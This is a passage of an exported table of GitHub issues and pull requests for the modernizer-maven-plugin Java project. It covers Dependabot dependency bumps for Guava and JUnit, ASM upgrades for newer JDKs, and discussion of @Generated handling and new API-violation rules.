<li><code>graph</code>: Added <code>incidentEdgeOrder()</code> to the <code>[Value]Graph</code> interfaces. (cde576ec00)</li>
<li><code>util.concurrent</code>: Added <code>Duration</code>-based <code>default</code> methods to <code>ListeningScheduledExecutorService</code>. (931e83f969)</li>
<li><code>util.concurrent</code>: Added <code>immediateVoidFuture</code>. (9f3bae5853)</li>
<li><code>util.concurrent</code>: Removed <code>@Beta</code> from <code>Service</code> and related classes. (dc46627fea)</li>
<li><code>util.concurrent</code>: Deprecated the 1-arg overload of <code>ServiceManager.addListener</code>. (86e3620125)</li>
<li><code>util.concurrent</code>: Changed the return type of <code>ServiceManager.servicesByState()</code> to <code>ImmutableSetMultimap</code> (but also retained a method with the old signature for binary compatibility). (31999ae6f5)</li>
<li><code>util.concurrent</code>: Made it safe to load the <code>AbstractFuture</code> class from a <code>ForkJoinPool</code> thread under a security manager. (6e0c5b5d50)</li>
</ul>
<h2>28.2</h2>
<h3>Maven</h3>
<pre lang=""xml""><code>&lt;dependency&gt;
  &lt;groupId&gt;com.google.guava&lt;/groupId&gt;
  &lt;artifactId&gt;guava&lt;/artifactId&gt;
  &lt;version&gt;28.2-jre&lt;/version&gt;
  &lt;!-- or, for Android: --&gt;
  &lt;version&gt;28.2-android&lt;/version&gt;
&lt;/tr&gt;&lt;/table&gt; 
</code></pre>
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/google/guava/commits"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=com.google.guava:guava&package-manager=maven&previous-version=27.0.1-jre&new-version=29.0-jre)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/gaul/modernizer-maven-plugin/network/alerts).

</details>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/122/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/122/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/122/events,https://github.com/gaul/modernizer-maven-plugin/pull/122,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/122
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/121,759201981,MDExOlB1bGxSZXF1ZXN0NTM0MjQyODgx,121,Improve documentation of ignoring Generated annotations.,1562274,closed,FALSE,NA,NA,1,2020-12-08T08:09:11Z,2020-12-08T08:57:55Z,2020-12-08T08:57:43Z,CONTRIBUTOR,NA,Closes #117 ,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/121/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/121/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/121/events,https://github.com/gaul/modernizer-maven-plugin/pull/121,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/121
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/120,758983355,MDU6SXNzdWU3NTg5ODMzNTU=,120,2.2.0 release,848247,closed,FALSE,NA,NA,2,2020-12-08T01:31:32Z,2021-03-17T13:58:28Z,2021-03-17T13:58:28Z,OWNER,NA,Mostly to incorporate #119.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/120/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/120/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/120/events,https://github.com/gaul/modernizer-maven-plugin/issues/120,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/119,758956851,MDExOlB1bGxSZXF1ZXN0NTM0MDM1NTg0,119,Upgraded to ASM 9.0 for Java 15/16 compatability.,1562274,closed,FALSE,NA,NA,1,2020-12-08T00:28:36Z,2021-04-20T21:55:59Z,2020-12-08T01:22:18Z,CONTRIBUTOR,NA,Closes #118 ,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/119/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/119/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/119/events,https://github.com/gaul/modernizer-maven-plugin/pull/119,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/119
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/118,758779108,MDU6SXNzdWU3NTg3NzkxMDg=,118,Crash on Java 15 preview-features,1562274,closed,FALSE,NA,NA,6,2020-12-07T19:20:37Z,2020-12-08T22:26:22Z,2020-12-08T01:22:18Z,CONTRIBUTOR,NA,"I was playing around with the Java 15 preview features (records to be exact) and Modernizer crashed on my code.

I could fix it by upgrade ASM to 8 and enable ASM8. I see that there is also an ASM9. What is your policy on updating ASM? The latest and greatest or the one for the latest release (including preview-features?) of the JDK?",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/118/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/118/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/118/events,https://github.com/gaul/modernizer-maven-plugin/issues/118,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/117,730336379,MDU6SXNzdWU3MzAzMzYzNzk=,117,Classes annotated with javax.annotation.Generated and javax.annotation.processing.Generated are not ignored,1562274,closed,FALSE,NA,NA,2,2020-10-27T10:50:54Z,2020-12-08T08:57:43Z,2020-12-08T08:57:43Z,CONTRIBUTOR,NA,"Expected behaviour:
Modernizer does not trigger on generated classes.

Shown behaviour:
Modernizer does trigger on classes with @Generated.

The current implementation looks at the class file to find the annotations. The default annotations (javax.annotation.Generated and javax.annotation.processing.Generated) are #RetentionLevel(SOURCE) and thus not available after compilation.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/117/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/117/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/117/events,https://github.com/gaul/modernizer-maven-plugin/issues/117,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/116,720161125,MDExOlB1bGxSZXF1ZXN0NTAyMjMyODQw,116,Bump junit from 4.12 to 4.13.1 in /modernizer-maven-plugin,49699333,closed,FALSE,NA,NA,0,2020-10-13T11:52:25Z,2021-04-12T08:44:44Z,2021-04-12T08:44:40Z,CONTRIBUTOR,NA,"Bumps [junit](https://github.com/junit-team/junit4) from 4.12 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>
<li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>
<li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>
<li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>
<li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>
<li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae""><code>610155b</code></a> Merge pull request from GHSA-269g-pwp5-87pp</li>
<li><a href=""https://github.com/junit-team/junit4/commit/b6cfd1e3d736cc2106242a8be799615b472c7fec""><code>b6cfd1e</code></a> Explicitly wrap float parameter for consistency (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1671"">#1671</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/a5d205c7956dbed302b3bb5ecde5ba4299f0b646""><code>a5d205c</code></a> Fix GitHub link in FAQ (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1672"">#1672</a>)</li>
<li><a href=""https://github.com/junit-team/junit4/commit/3a5c6b4d08f408c8ca6a8e0bae71a9bc5a8f97e8""><code>3a5c6b4</code></a> Deprecated since jdk9 replacing constructor instance of Double and Float (<a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1660"">#1660</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/junit-team/junit4/compare/r4.12...r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.12&new-version=4.13.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/configuring-github-dependabot-security-updates)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/gaul/modernizer-maven-plugin/network/alerts).

</details>",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/116/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/116/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/116/events,https://github.com/gaul/modernizer-maven-plugin/pull/116,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/116
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/115,702346226,MDU6SXNzdWU3MDIzNDYyMjY=,115,Add new violations for Java 13-15,848247,open,FALSE,NA,NA,0,2020-09-15T23:50:49Z,2020-09-15T23:50:49Z,NA,OWNER,NA,"Audit Java 13-15 API additions using something like:

https://gunnarmorling.github.io/jdk-api-diff/jdk14-jdk15-api-diff.html",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/115/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/115/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/115/events,https://github.com/gaul/modernizer-maven-plugin/issues/115,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/114,659279626,MDU6SXNzdWU2NTkyNzk2MjY=,114,Add violations for Iterables Stream equivalents,848247,open,FALSE,NA,NA,0,2020-07-17T13:58:58Z,2020-07-17T13:58:58Z,NA,OWNER,NA,"Javadoc helpfully annotates these, for example, replacing `Iterables.getLast` with ` Streams.findLast().get()`:

https://guava.dev/releases/21.0/api/docs/com/google/common/collect/Iterables.html#getLast-java.lang.Iterable-T-",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/114/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/114/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/114/events,https://github.com/gaul/modernizer-maven-plugin/issues/114,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/113,585331697,MDExOlB1bGxSZXF1ZXN0MzkxNzQ0MzY5,113,Changing classes to be public,2686690,closed,FALSE,NA,NA,3,2020-03-20T21:16:37Z,2020-03-23T05:15:42Z,2020-03-21T02:56:08Z,CONTRIBUTOR,NA,This change allows the classes to be used by projects and tools outside of a maven plugin environment.,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/113/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/113/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/113/events,https://github.com/gaul/modernizer-maven-plugin/pull/113,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/113
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/112,584352791,MDU6SXNzdWU1ODQzNTI3OTE=,112,No worky on java 14,18299,closed,FALSE,NA,NA,4,2020-03-19T11:43:10Z,2020-03-22T09:40:42Z,2020-03-22T09:40:42Z,NONE,NA,"Even with https://github.com/gaul/modernizer-maven-plugin/commit/8269ed8cce6df6b84756242708c74a3ba2ee9864 and running on 2.0.0 I get
```
[ERROR] Failed to execute goal org.gaul:modernizer-maven-plugin:2.0.0:modernizer (modernizer) on project jfr-srv-openapi: Execution modernizer of goal org.gaul:modernizer-maven-plugin:2.0.0:modernizer failed: Unsupported class file major version 58 -> [Help 1]
```",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/112/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/112/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/112/events,https://github.com/gaul/modernizer-maven-plugin/issues/112,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/111,559457296,MDU6SXNzdWU1NTk0NTcyOTY=,111,Use public scope on your classes,2686690,closed,FALSE,NA,NA,5,2020-02-04T02:59:31Z,2020-03-20T21:17:08Z,2020-03-20T21:17:07Z,CONTRIBUTOR,NA,The way you have designed your Modernizer code it can be easily used outside of a maven plugin except that the classes are not public.  I see no benefit of keeping the classes package private.  However if they were public I could wrap it in a command line utility or incorporate it into other build tools.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/111/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/111/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/111/events,https://github.com/gaul/modernizer-maven-plugin/issues/111,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/110,558779694,MDU6SXNzdWU1NTg3Nzk2OTQ=,110,Figure out minimum supported Java version,848247,closed,FALSE,NA,NA,7,2020-02-02T23:58:15Z,2020-02-08T09:03:25Z,2020-02-08T09:03:25Z,OWNER,NA,"I have previously tested modernizer with Java 6 although various Java 7 dependencies have crept in since CI does not enforce this.  I believe that applications can still run modernizer with Java 6 although developers cannot compile and test with it due to #109, Guava, and probably other things.  I don't know that this project needs any sort of heroics but if earlier JDK support is easy then it would be nice to have.  At a minimum JDK 8 should work since this is LTS and hopefully JDK 7 too.

cc: @hazendaz",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/110/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/110/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/110/events,https://github.com/gaul/modernizer-maven-plugin/issues/110,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/109,558754566,MDExOlB1bGxSZXF1ZXN0MzcwMDUzNTMw,109,[pom] Add missing version to maven jar plugin at 3.2.0,975267,closed,FALSE,NA,NA,4,2020-02-02T20:41:45Z,2020-02-03T00:38:52Z,2020-02-02T23:01:50Z,CONTRIBUTOR,NA,"Jar plugin version was not defined in parent about this usage.  While mavens super parent pom will address many of the plugins, they are ultimately going to remove that and enforce proper usage.  Also, higher jdk usage will through warnings due to not defining the version.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/109/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/109/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/109/events,https://github.com/gaul/modernizer-maven-plugin/pull/109,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/109
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/108,558754093,MDExOlB1bGxSZXF1ZXN0MzcwMDUzMTU2,108,[pom] Upgrade invoker plugin to latest and override groovy to latest,975267,closed,FALSE,NA,NA,1,2020-02-02T20:38:53Z,2020-03-15T04:23:44Z,2020-03-15T04:23:33Z,CONTRIBUTOR,NA,"To support higher jdks

Maven invoker plugin is on groovy 2.2.2 for jdk 6 and 2.4.8 for jdk 7.  It works without question on latest releases.  In order to support higher jdks, this needs to be overridden otherwise builds will fail.  This does not impact the code base and all IT tests run as with before.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/108/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/108/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/108/events,https://github.com/gaul/modernizer-maven-plugin/pull/108,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/108
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/107,558753174,MDExOlB1bGxSZXF1ZXN0MzcwMDUyNDU2,107,Modify verify.groovy IT test to support cross platform,975267,closed,FALSE,NA,NA,1,2020-02-02T20:32:59Z,2020-02-02T23:00:08Z,2020-02-02T22:59:51Z,CONTRIBUTOR,NA,"test assuming using *nix.  Fixed so this works on both windows and *nix.

File.separator is required for cross platform support.  When using windows, the default is \ which will fail this IT test.  This IT tests is expecting *nix only.  The result here is the same but ensures cross platform usage uses the right file seperator.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/107/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/107/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/107/events,https://github.com/gaul/modernizer-maven-plugin/pull/107,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/107
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/106,557250969,MDExOlB1bGxSZXF1ZXN0MzY4ODc0NjAw,106,"Build fixes, jdk support through 15, raise to jdk 7 requirement",975267,closed,FALSE,NA,NA,2,2020-01-30T03:53:59Z,2020-12-28T22:33:46Z,2020-12-28T22:33:46Z,CONTRIBUTOR,NA,"This PR fixes #105 and #92.

There were maven build complaints during build which have been addressed.

While project itself will support jdk 15, the integration tests will not as seen per Travis CI.  This has to do with a wait on groovy to support jdk 15.  They merged the support today to their master but no specific ETA on when they will make that available.  At time I checked they had not yet merged that into the 3.0.0 line that is going through RC status.

In order to support higher jdks with this build, the tests to check for violation of sun.* usage has been removed.  The classes no longer exist in newer jdks and that is a bit of duplication over other checks.  The checks still are valid just test for them are not on higher jdks.  A different solution would need to occur to check for them.  One possibility is to isolate and run in the toolchains.  However, this effort was just to show this was possible to raise the build up.

I do not anticipate this comes in all together.  This was just a POC to show all of this.  Please take a look and indicate how you would like to proceed.  I can raise separate PRs as would be needed.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/106/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/106/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/106/events,https://github.com/gaul/modernizer-maven-plugin/pull/106,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/106
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/105,556992000,MDU6SXNzdWU1NTY5OTIwMDA=,105,Upgrade ASM for jdk 14 / 15 support to ASM 7.3.1,975267,closed,FALSE,NA,NA,3,2020-01-29T16:57:11Z,2020-02-05T06:26:34Z,2020-02-05T06:26:34Z,CONTRIBUTOR,NA,"Direct support for jdk 14 / 15 fails due to old ASM.  Please upgrade.  See ASM notes https://asm.ow2.io/versions.html.

Overriding this project for ASM 7.3.1 currently fixes the issue.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/105/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/105/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/105/events,https://github.com/gaul/modernizer-maven-plugin/issues/105,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/104,537877320,MDU6SXNzdWU1Mzc4NzczMjA=,104,Consider URL violation,848247,open,FALSE,NA,NA,0,2019-12-14T07:00:50Z,2019-12-14T07:00:50Z,NA,OWNER,NA,Users should prefer `URI` due to `URL.equals` strange behavior.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/104/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/104/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/104/events,https://github.com/gaul/modernizer-maven-plugin/issues/104,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/103,520656963,MDExOlB1bGxSZXF1ZXN0MzM5MTkwNTI3,103,Introduce two int math suggestions,513280,closed,FALSE,NA,NA,1,2019-11-10T21:01:34Z,2019-11-11T17:39:50Z,2019-11-11T13:58:22Z,CONTRIBUTOR,NA,"- Suggest JDK 8's `Math.toIntExact` instead of Guava's `Ints.checkedCast`.
- Suggest JDK 8's `Math.checkedSubtract` instead of Guava's `IntMath.checkedSubtract`.

Fixes #102.",NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/103/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/103/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/103/events,https://github.com/gaul/modernizer-maven-plugin/pull/103,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/103
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/102,520523705,MDU6SXNzdWU1MjA1MjM3MDU=,102,`Ints.checkedCast` vs. `Math.toIntExact`,513280,closed,FALSE,NA,NA,2,2019-11-09T22:43:01Z,2019-11-11T13:58:22Z,2019-11-11T13:58:22Z,CONTRIBUTOR,NA,"Guava's [`Ints.checkedCast`](https://google.github.io/guava/releases/28.1-jre/api/docs/com/google/common/primitives/Ints.html#checkedCast-long-) can be replaced with Java 8's [`Math.toIntExact`](https://docs.oracle.com/javase/8/docs/api/java/lang/Math.html#toIntExact-long-). As described in google/guava#3105, the only difference is the exception they throw. Keeping in mind this subtle difference: is `Ints.checkedCast` eligible for inclusion in `modernizer-maven-plugin`? If so, I'll open a PR.",NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/102/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/102/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/102/events,https://github.com/gaul/modernizer-maven-plugin/issues/102,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/101,506355239,MDU6SXNzdWU1MDYzNTUyMzk=,101,2.0.0 release,848247,closed,FALSE,NA,NA,1,2019-10-13T17:37:11Z,2019-10-17T23:10:46Z,2019-10-17T23:10:45Z,OWNER,NA,Includes `@Generated` suppression and some JDK 11 violation fixes.  Need to diagnose regression from #99 before releasing.,NA,FALSE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/101/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/101/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/101/events,https://github.com/gaul/modernizer-maven-plugin/issues/101,NA
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/100,506312099,MDExOlB1bGxSZXF1ZXN0MzI3NTQ2OTMy,100,Don't suggest java.io.InputStream.skipNBytes(long) before JDK 12,513280,closed,FALSE,NA,NA,2,2019-10-13T11:28:52Z,2019-10-13T18:04:31Z,2019-10-13T17:28:46Z,CONTRIBUTOR,NA,Compare [JDK 11](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/InputStream.html) and [JDK 12](https://docs.oracle.com/en/java/javase/12/docs/api/java.base/java/io/InputStream.html).,NA,TRUE,https://api.github.com/repos/gaul/modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/100/labels{/name},https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/100/comments,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/100/events,https://github.com/gaul/modernizer-maven-plugin/pull/100,https://api.github.com/repos/gaul/modernizer-maven-plugin/pulls/100
gaul,modernizer-maven-plugin,https://api.github.com/repos/gaul/modernizer-maven-plugin/issues/99,492617119,MDExOlB1bGxSZXF1ZXN0MzE2NzU0OTY4,99,Ignore classes annotated with `@Generated` #28,1206309,closed,FALSE,NA,NA,10,2019-09-12T06:45:29Z,2019-10-17T22:58:45Z,2019-10-13T17:29:13Z,CONTRIBUTOR,NA,"Provide an implementation for #28.

This is a rather dirty implementation. Based on the already existing suppression filter. There is a lot of duplicated code right now and no test.

Should this PR be improved or can it be accepted as is?

